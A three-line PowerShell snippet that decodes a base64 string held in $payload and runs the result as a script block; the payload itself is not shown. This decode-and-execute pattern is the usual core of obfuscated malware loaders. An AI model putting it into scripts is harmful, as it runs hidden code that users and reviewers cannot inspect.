$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
$sb = [ScriptBlock]::Create($decoded)
& $sb
